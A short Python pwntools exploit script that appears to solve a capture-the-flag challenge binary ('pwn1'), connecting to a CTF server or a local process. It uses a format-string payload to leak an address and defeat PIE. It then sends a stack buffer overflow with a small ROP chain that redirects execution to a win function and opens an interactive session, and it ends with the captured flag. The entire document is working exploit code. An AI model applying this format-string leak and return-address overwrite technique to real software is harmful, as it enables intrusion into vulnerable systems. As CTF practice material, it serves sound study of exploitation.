#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./pwn1")
libc = exe.libc

r = None
def connect(fresh=True, local=False):
    global r
    if r is not None:
        if fresh:
            r.close()
        else:
            return
    r = remote("hax1.allesctf.net", 9100) if args.REMOTE and not local else exe.process()

connect()

r.sendlineafter("witch name:\n", "out %39$p outend")
addr = r.recvuntil(b" outend", drop=True).split(b" ")[-1].decode()
exe.address += int(addr, 16) - (exe.symbols.main + 45)
success("exe base: %#x", exe.address)

r.sendlineafter("magic spell:", flat({
    0x0: "Expelliarmus\0" ,
    0x108: [
        # stack alignment,
        exe.address + 0x99a,
        exe.symbols.WINgardium_leviosa
    ]

}))

r.interactive()

# CSCG{NOW_PRACTICE_MORE}
